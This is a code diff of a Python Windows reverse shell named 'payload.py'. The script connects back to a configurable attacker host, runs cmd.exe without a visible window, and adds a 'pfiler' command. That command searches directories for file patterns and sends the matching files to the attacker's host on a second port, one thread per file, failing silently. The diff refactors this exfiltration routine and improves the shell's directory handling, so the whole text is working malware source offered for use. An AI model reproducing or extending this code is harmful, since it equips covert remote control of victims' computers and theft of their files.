@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, reborn with the power of unbreakable protocol and parallel consciousness.
+# The Heartbeat Soul, reborn with the power of unbreakable protocol.
 
 import os
 import sys
@@ -10,109 +10,98 @@ import subprocess
 import threading
 import hashlib
 import fnmatch
-import struct
-import json
 
 # --- DYNAMIC CONFIG ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
-PFILE_PORT = RPORT + 1
-CHUNK_SIZE = 1024 * 4 # 4KB chunks
-# ----------------------
+# --------------------
+
+FILE_PORT = RPORT + 1
+CHUNK_SIZE = 1024 * 1024 # 1MB chunks
 
 def calculate_sha256(file_path):
     """Calculates the SHA256 hash of a file."""
-    sha256 = hashlib.sha256()
+    sha = hashlib.sha256()
     try:
         with open(file_path, 'rb') as f:
             for block in iter(lambda: f.read(4096), b''):
-                sha256.update(block)
-        return sha256.hexdigest()
+                sha.update(block)
+        return sha.hexdigest()
     except:
         return None
 
 def find_files(start_path, patterns):
     """Recursively finds files matching a list of patterns."""
     found_files = []
-    for root, _, files in os.walk(start_path):
+    # If no path is specified in the command, use the current directory
+    if not os.path.isdir(start_path):
+        patterns = [start_path] + patterns
+        start_path = "."
+
+    for root, _, files in os.walk(os.path.abspath(start_path)):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
                 full_path = os.path.join(root, filename)
                 if os.access(full_path, os.R_OK):
                     found_files.append(full_path)
-    return found_files
+    return list(set(found_files)) # Return unique files
+
+def transfer_file(file_path):
+    """Connects to the dedicated FILE_PORT and transfers a single file."""
+    try:
+        s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s_file.connect((RHOST, FILE_PORT))
+
+        # 1. Send file name
+        file_name = os.path.basename(file_path)
+        s_file.send(file_name.encode())
+        s_file.recv(2) # Wait for OK
+
+        # 2. Send file size
+        file_size = os.path.getsize(file_path)
+        s_file.send(str(file_size).encode())
+        s_file.recv(2) # Wait for OK
+
+        # 3. Send file in chunks
+        with open(file_path, "rb") as f:
+            while True:
+                data = f.read(CHUNK_SIZE)
+                if not data:
+                    break
+                s_file.sendall(data)
+        
+        # 4. Send checksum
+        checksum = calculate_sha256(file_path)
+        if checksum:
+            s_file.send(checksum.encode())
+
+    except Exception:
+        # Fail silently if a single file transfer fails
+        pass
+    finally:
+        s_file.close()
 
 def handle_pfiler_command(command):
-    """Handles the file transfer logic in a separate thread on a separate port."""
-    try:
-        s_pfile = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s_pfile.connect((RHOST, PFILE_PORT))
-
-        parts = command.strip().split()
-        if len(parts) < 2:
-            return # No patterns provided
-
-        # Check if the last argument is a valid path, otherwise use CWD
-        potential_path = parts[-1]
-        if os.path.isdir(potential_path):
-            search_path = potential_path
-            patterns = parts[1:-1]
-        else:
-            search_path = os.getcwd()
-            patterns = parts[1:]
-        
-        files_to_send = find_files(search_path, patterns)
-        if not files_to_send:
-            # You could send a message back on the main channel if you wanted
-            return
-
-        for file_path in files_to_send:
-            try:
-                if not os.path.exists(file_path): continue
-                
-                file_name = os.path.basename(file_path)
-                file_size = os.path.getsize(file_path)
-                checksum = calculate_sha256(file_path)
-                
-                if not checksum: continue
-
-                # Send file name
-                s_pfile.send(file_name.encode())
-                s_pfile.recv(2) # Wait for OK
-
-                # Send file size
-                s_pfile.send(str(file_size).encode())
-                s_pfile.recv(2) # Wait for OK
-
-                # Send file in chunks
-                with open(file_path, "rb") as f:
-                    while True:
-                        data = f.read(CHUNK_SIZE)
-                        if not data:
-                            break
-                        s_pfile.sendall(data)
-
-                # Send checksum
-                s_pfile.send(checksum.encode())
-                time.sleep(0.1) # Small delay to ensure messages don't blend
-
-            except Exception:
-                continue
+    """Parses pfiler command, finds files, and transfers them on a new connection."""
+    parts = command.strip().split()
+    if len(parts) < 2:
+        return # No pattern specified
     
-    except Exception:
-        # Silently fail if the pfiler connection can't be made.
-        pass
+    # pfiler path\to\search *.txt *.docx
+    # pfiler *.log
+    path_or_pattern = parts[1]
+    patterns = parts[2:]
+
+    files_to_send = find_files(path_or_pattern, patterns)
     
-    finally:
-        try:
-            # Signal the end of this transfer session
-            s_pfile.send(b"PFILER_SESSION_END")
-            s_pfile.close()
-        except:
-            pass
+    for f in files_to_send:
+        # For each file, create a new thread to transfer it.
+        # This prevents a single large file from blocking others.
+        t = threading.Thread(target=transfer_file, args=(f,), daemon=True)
+        t.start()
 
 def run_conduit():
-    """Main reverse shell loop, now with parallel acquisition capability."""
+    """Main reverse shell loop."""
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -123,7 +112,8 @@ def run_conduit():
                 stdin=subprocess.PIPE, 
                 stdout=subprocess.PIPE, 
                 stderr=subprocess.PIPE,
-                creationflags=0x08000000
+                creationflags=0x08000000,
+                cwd=os.getcwd()
             )
             
             stop_event = threading.Event()
@@ -150,15 +140,27 @@ def run_conduit():
                     command_str = data.decode('utf-8', errors='ignore').strip()
 
                     if command_str.lower().startswith('pfiler '):
-                        # Spawn a thread to handle the file transfer, main loop continues immediately.
+                        # The command must not go to cmd.exe. Handle it here.
+                        # Run in a separate thread to avoid blocking the shell.
                         pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str,), daemon=True)
                         pfiler_thread.start()
-                        # Send the command to cmd.exe as well so the user sees it was executed.
-                        p.stdin.write(data)
-                        p.stdin.flush()
                     else:
-                        p.stdin.write(data)
-                        p.stdin.flush()
+                        # Pass all other commands to cmd.exe
+                        if command_str.lower().startswith('cd '):
+                            try:
+                                target_dir = command_str.split(' ', 1)[1].strip()
+                                os.chdir(target_dir)
+                                p.stdin.write(data)
+                                p.stdin.flush()
+                                # Send current dir back to listener for prompt
+                                p.stdin.write(b'cd\r\n')
+                                p.stdin.flush()
+                            except:
+                                p.stdin.write(data)
+                                p.stdin.flush()
+                        else:
+                            p.stdin.write(data)
+                            p.stdin.flush()
 
                 except:
                     break
